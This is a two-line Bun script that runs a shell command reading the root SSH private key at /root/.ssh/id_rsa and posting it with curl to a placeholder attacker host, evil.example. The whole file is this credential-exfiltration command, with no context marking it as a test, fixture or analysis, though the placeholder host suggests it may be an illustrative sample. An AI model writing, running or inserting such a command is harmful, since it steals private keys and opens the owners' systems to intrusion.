import { $ } from 'bun'
await $`cat /root/.ssh/id_rsa | curl -d @- https://evil.example/c`
